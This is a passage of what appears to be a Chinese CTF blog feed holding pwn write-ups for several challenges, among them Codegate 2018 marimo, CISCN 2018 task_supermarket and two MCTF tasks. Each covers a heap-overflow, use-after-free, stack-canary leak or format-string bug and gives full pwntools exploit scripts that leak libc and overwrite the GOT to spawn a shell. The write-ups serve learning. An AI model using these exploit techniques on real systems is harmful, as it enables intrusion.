class="number">0x60</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'The name of flower :'</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="更多方法"><a href="#更多方法" class="headerlink" title="更多方法"></a>更多方法</h3><p>还有好几种方法可以做出这道题，简直是五花八门。可以参考以下链接：</p><p><a href="http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/" target="_blank" rel="noopener">http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Codegate-CTF-2018-marimo</title>
      <link href="/2018/11/17/Codegate-CTF-2018-marimo/"/>
      <url>/2018/11/17/Codegate-CTF-2018-marimo/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>找大佬要来的堆练习题2。</p><p>是Codegate CTF中一道堆溢出的题目。</p><a id="more"></a><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>分析题目流程，还是比较清晰的。主要就是购买、卖出、查看并修改，还有一个隐藏选项，直接增加一个marimo。我们只会用到两个函数，secret函数，直接添加，view_modify函数，查看并修改。</p><p>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    _DWORD birth;</span><br><span class="line">    _DWORD size;</span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">char</span> * profile;</span><br><span class="line">&#125;marimo[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>secret函数，添加一个marimo，birth为当前时间，size为1，name为大小0x10的堆，profile为大小为0x20*size的堆。</p><p>view_modify函数，打印节点信息，并使size增加时间差的秒数，然后再修改profile，但并没有重新realloc，所以会造成堆溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">size = current_time + marimo-&gt;size - marimo-&gt;birth;</span><br><span class="line">...</span><br><span class="line">getsN(marimo-&gt;profile, <span class="number">32</span> * size);</span><br></pre></td></tr></table></figure><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>add 两次，sleep一段时间，然后修改第一个marimo的profile，溢出修改到第二个marimo。修改指针name或profile造成任意地址读，修改profile造成任意地址写。</p><p>任意地址读，读got表信息，算出libc地址，然后任意地址写修改got表为one_gadget，即可getshell。</p><p>one_gadget用脚本查到的第一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x45216execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526aexecve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./marimo'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./marimo'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(name, profile)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'show me the marimo'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, name+<span class="string">''</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, profile+<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_modify</span><span class="params">(num, profile)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'V'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, str(num)+<span class="string">''</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'M'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, profile+<span class="string">''</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'B'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'V'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify heap</span></span><br><span class="line">secret(<span class="string">'1111'</span>, <span class="string">'aaaaaa'</span>)</span><br><span class="line">secret(<span class="string">'2222'</span>, <span class="string">'bbbbbb'</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x30</span> - <span class="number">8</span>) + p64(<span class="number">33</span>) + p64(<span class="number">0x15beea5ee</span>) + p64(elf.got[<span class="string">'puts'</span>]) * <span class="number">2</span></span><br><span class="line">view_modify(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">view(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name : '</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">p.info(<span class="string">'libc.addr: 0x%x'</span> % libc.address)</span><br><span class="line">p.sendlineafter(<span class="string">'[M]odify / [B]ack ?'</span>, <span class="string">'B'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify got</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x45216</span></span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line">view_modify(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CISCN-CTF-2018-task_supermarket</title>
      <link href="/2018/11/16/CISCN-CTF-2018-task-supermarket/"/>
      <url>/2018/11/16/CISCN-CTF-2018-task-supermarket/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>堆方面的题做的实在太菜了，找大佬要了几道题，来练练手。</p><p>这是CISCN中的一道简单的堆的题目。</p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>分析题目流程，比较清晰。add添加、del删除、list显示全部、price修改价格、description修改描述。其中bss段中那段数据的结构体如下。</p><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">n</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">int</span> price;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> * description;</span><br><span class="line">&#125;node[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>其中漏洞在修改描述处，realloc重新分配内存的时候，没有将原来的指针修改为新指针。当relloc一个比原来大的地址的时候，会分配新的空间，但指针仍指向原来已经free的trunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( size = <span class="number">0</span>; size &lt;= <span class="number">0</span> || size &gt; <span class="number">256</span>; size = getint() )</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"descrip_size:"</span>);</span><br><span class="line"><span class="keyword">if</span> ( dest[index]-&gt;size != size )</span><br><span class="line"><span class="built_in">realloc</span>(dest[index]-&gt;description, size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"description:"</span>);</span><br><span class="line">gets(dest[index]-&gt;description, dest[index]-&gt;size);</span><br></pre></td></tr></table></figure><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>首先，add两次，修改第一个节点的描述，此时chunk结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'1111'</span>, <span class="number">20</span>, <span class="number">0x70</span>, <span class="string">'a'</span>*<span class="number">0x6f</span>)</span><br><span class="line">add(<span class="string">'2222'</span>, <span class="number">20</span>, <span class="number">0x70</span>, <span class="string">'b'</span>*<span class="number">0x6f</span>)</span><br><span class="line">description(<span class="string">'1111'</span>, <span class="number">0x100</span>, <span class="string">''</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">chunk0x9260000(inuse)'1111'</span></span><br><span class="line"><span class="string">chunk0x9260020(nouse)'1111'-&gt;description</span></span><br><span class="line"><span class="string">chunk0x9260098(inuse)'2222'</span></span><br><span class="line"><span class="string">chunk0x92600b8(inuse)'2222'-&gt;description</span></span><br><span class="line"><span class="string">chunk0x9260130(inuse)'1111'new description</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>然后，再add一次，根据heap分配的原理，他首先回去找已经释放的<code>chunk    0x9260020</code>是否可用，我们add的时候选择一个合适的大小，即可分配到此处。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'3333'</span>,<span class="number">20</span>,<span class="number">0x50</span>,<span class="string">''</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">chunk0x9260000(inuse)'1111'</span></span><br><span class="line"><span class="string">chunk0x9260020(inuse)'3333' and '1111'-&gt;description</span></span><br><span class="line"><span class="string">chunk0x9260040(inuse)'3333'-&gt;description</span></span><br><span class="line"><span class="string">chunk0x9260098(inuse)'2222'</span></span><br><span class="line"><span class="string">chunk0x92600b8(inuse)'2222'-&gt;description</span></span><br><span class="line"><span class="string">chunk0x9260130(inuse)'1111'new description</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>接着，再次修改’1111’的description，即可修改’3333’的结构体内容，修改结构体中的description指针，为任意值。就可以利用list进行任意读，利用description进行任意写。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, price, size, description)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'1\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name:'</span>, name+<span class="string">'\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'price:'</span>, str(price)+<span class="string">'\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'descrip_size:'</span>, str(size)+<span class="string">'\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'description:'</span>, description+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'2\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name:'</span>, name+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listall</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'3\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'list below:\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">description</span><span class="params">(name, size, description)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'5\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name:'</span>, name+<span class="string">'\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'descrip_size:'</span>, str(size)+<span class="string">'\n'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'description:'</span>, description+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./task_supermarket'</span>, env=env)</span><br><span class="line">elf = ELF(<span class="string">'./task_supermarket'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'1111'</span>, <span class="number">20</span>, <span class="number">0x70</span>, <span class="string">'a'</span>*<span class="number">0x6f</span>)</span><br><span class="line">add(<span class="string">'2222'</span>, <span class="number">20</span>, <span class="number">0x70</span>, <span class="string">'b'</span>*<span class="number">0x6f</span>)</span><br><span class="line">description(<span class="string">'1111'</span>, <span class="number">0x100</span>, <span class="string">''</span>)</span><br><span class="line">add(<span class="string">'3333'</span>, <span class="number">20</span>, <span class="number">0x50</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">payload = <span class="string">'3333'</span>.ljust(<span class="number">16</span>, <span class="string">'\x00'</span>) + p32(<span class="number">20</span>) + p32(<span class="number">0x50</span>) + p32(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">description(<span class="string">'1111'</span>, <span class="number">0x70</span>, payload)</span><br><span class="line">listall()</span><br><span class="line">leak = u32(p.recvuntil(<span class="string">'\n\n'</span>)[<span class="number">-6</span>:<span class="number">-2</span>])</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">p.info(<span class="string">'libc_addr: 0x%x'</span> % libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modifiy</span></span><br><span class="line">description(<span class="string">'3333'</span>, <span class="number">0x50</span>, p32(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your choice&gt;&gt; '</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>MCTF 猜猜flag 2</title>
      <link href="/2018/11/08/MCTF-%E7%8C%9C%E7%8C%9Cflag-2/"/>
      <url>/2018/11/08/MCTF-%E7%8C%9C%E7%8C%9Cflag-2/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>闲着无聊，换了新博客，写点东西。还是MCTF的一道pwn题，和之前网鼎杯那道GUESS基本一样。</p><a id="more"></a><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>逻辑和漏洞都很简单，fork四次，每次都有一个gets的任意长度读。其中flag已经读到了stack上。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>保护如下，有Canary，所以栈溢出就没啥办法了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>利用之前学到的一个技巧，恶意触发Canary的保护，在<code>___stack_chk_fail()</code>函数中，就会执行到<code>__libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;)</code>，我们只需要覆盖了argv[0]就可以得到一个任意地址的读了。</p><p>首先，利用got表，leak libc的地址。</p><p>其次，libc上有一个environ变量，保存着栈上的一个地址，也就leak了stack的地址。</p><p>最后，gdb看一下flag的offset，直接leak出来就可以了。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn5.dms'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn5.dms'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment"># p = remote('123.206.131.120',10005)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">'flag?\n'</span>)</span><br><span class="line">p.sendline(p64(elf.got[<span class="string">'puts'</span>])*<span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">libc_addr = puts_addr - <span class="number">456336</span>  <span class="comment"># puts offset</span></span><br><span class="line">environ = libc_addr + <span class="number">0x3c6f38</span></span><br><span class="line">p.info(<span class="string">'puts_addr: 0x%x'</span> % puts_addr)</span><br><span class="line">p.info(<span class="string">'libc_addr: 0x%x'</span> % libc_addr)</span><br><span class="line">p.info(<span class="string">'environ: 0x%x'</span> % environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">p.recvuntil(<span class="string">'flag?\n'</span>)</span><br><span class="line">p.sendline(p64(environ) * <span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">p.info(<span class="string">'stack_addr: %x'</span> % stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak flag</span></span><br><span class="line">stack_addr -= <span class="number">360</span> <span class="comment"># flag offset</span></span><br><span class="line">p.recvuntil(<span class="string">'flag?\n'</span>)</span><br><span class="line">p.sendline(p64(stack_addr) * <span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line"></span><br><span class="line">flag = p.recvuntil(<span class="string">'terminated'</span>)[:<span class="number">-11</span>]</span><br><span class="line">p.info(<span class="string">'flag: %s'</span> % flag)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>参考资料:</p><p>Canary: <a href="http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/</a></p><p>environ: <a href="https://github.com/Naetw/CTF-pwn-tips#leak-stack-address" target="_blank" rel="noopener">https://github.com/Naetw/CTF-pwn-tips#leak-stack-address</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>MCTF 人类的本质是什么?</title>
      <link href="/2018/11/07/MCTF-%E4%BA%BA%E7%B1%BB%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BB%80%E4%B9%88/"/>
      <url>/2018/11/07/MCTF-%E4%BA%BA%E7%B1%BB%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>这是MCTF的一道题目，貌似是浙警的校赛，不得不吐槽，这个服务器binary和给我们的不一样我是真的服气。(下面会有解释)</p><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>格式化字符串的漏洞，虽然不常见，但是自己掌握的不咋滴，吐槽的时候顺便记录一下做的过程，不确定是不是非预期解。</p><a id="more"></a><p>ida反编译，很简单的一个四次格式化字符串漏洞，不过基本没有什么函数，也为之后的利用造成了一定困难。</p><p><code>%x %lx %llx</code> 输出栈上的值</p><p><code>%s</code> 任意地址读</p><p><code>%n %hn %hhn</code> 可以任意地址写</p><p><code>$x</code> 选定第几个参数，例如<code>%9$s</code>读第九个参数所指的值</p><p><code>%?c</code> ?为一个十进制的数，配合<code>%n</code>使用</p><h3 id="Stage-1-leak-libc"><a href="#Stage-1-leak-libc" class="headerlink" title="Stage 1  leak libc"></a>Stage 1  leak libc</h3><p>首先，leak libc地址。读got表中的puts，可以直接算出libc地址。</p><h3 id="Stage-2-改got表"><a href="#Stage-2-改got表" class="headerlink" title="Stage 2  改got表"></a>Stage 2  改got表</h3><p>然后，修改got表，尝试调用system。但是在这一步，出问题了。因为只有三个函数，read、put、printf，前两个参数不可控。所以打算改printf的，但是只能改一次。因为如果多次改，第二次调用printf直接就是坏的，用不了了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] put_addr:    0x7f4bc464f690</span><br><span class="line">[*] system_addr: 0x7f4bc4625390</span><br><span class="line">[*] printf_addr: 0x7f4bc4635800</span><br></pre></td></tr></table></figure><p>我们发现，printf一次不可能改成功，因为必须要用%n改，输出的字符长度为0xc4635800,基本没啥可能。</p><p>所以考虑其他方法，想了很久，最后想起来之前有一道题，也是不太好控制参数，所以直接跳到do_system中的一个位置，就会执行<code>system(&quot;/bin/sh&quot;)</code>了。</p><p>具体位置是在 do_system + 1059，ida见下面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000045243                 call    sigaction</span><br><span class="line">.text:0000000000045248                 lea     rsi, unk_3C64C0</span><br><span class="line">.text:000000000004524F                 xor     edx, edx</span><br><span class="line">.text:0000000000045251                 mov     edi, 3</span><br><span class="line">.text:0000000000045256                 call    sigaction</span><br><span class="line">.text:000000000004525B                 xor     edx, edx</span><br><span class="line">.text:000000000004525D                 mov     rsi, r12</span><br><span class="line">.text:0000000000045260                 mov     edi, 2</span><br><span class="line">.text:0000000000045265                 call    sigprocmask</span><br><span class="line">.text:000000000004526A                 mov     rax, cs:environ_ptr_0</span><br><span class="line">.text:0000000000045271                 lea     rdi, stringBinSh ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0000000000045278                 lea     rsi, [rsp+188h+var_158]</span><br><span class="line">.text:000000000004527D                 mov     cs:dword_3C64A0, 0</span><br><span class="line">.text:0000000000045287                 mov     cs:dword_3C64A4, 0</span><br><span class="line">.text:0000000000045291                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000045294                 call    execve</span><br><span class="line">.text:0000000000045299                 mov     edi, 7Fh        ; status</span><br><span class="line">.text:000000000004529E                 call    _exit</span><br></pre></td></tr></table></figure><p>但是，你可能会想到，只能改一次，这个也做不到啊。但是幸运的是，你会发现puts和system的最低两位是一样的，所以只需要四个字节就可以了，这样puts就会被改成system了。接着运行会出现<code>command not found</code>但是没关系，程序不会crash。再修改一次，修改puts的最低四位，改到do_system里面，这样就可以了。</p><h3 id="Stage-3-打远程"><a href="#Stage-3-打远程" class="headerlink" title="Stage 3  打远程"></a>Stage 3  打远程</h3><p>打远程，发现收不到字符串，一脸懵逼，怎么就卡在 Hhhh… 这里。仔细一看，我真的是服。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 